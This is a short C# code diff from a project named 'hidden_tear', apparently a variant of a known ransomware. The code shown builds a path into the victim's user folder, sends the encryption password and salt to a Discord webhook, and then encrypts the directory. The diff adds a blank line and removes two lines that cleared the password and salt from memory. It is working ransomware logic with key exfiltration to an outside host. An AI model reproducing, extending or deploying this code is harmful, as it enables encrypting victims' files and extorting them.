@@ -22,6 +22,7 @@ namespace hidden_tear
             {
                 startAction();
             });
+
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
             Application.Run(new Form1());
@@ -71,8 +72,6 @@ namespace hidden_tear
             string startPath = Config.userDir + Config.userName + path;
             await Logger.SendData(Config.DiscordWebhook,password, salt);
             encryptDirectory(startPath, password, salt);
-            password = null;
-            salt = null;
         }
     }
 }
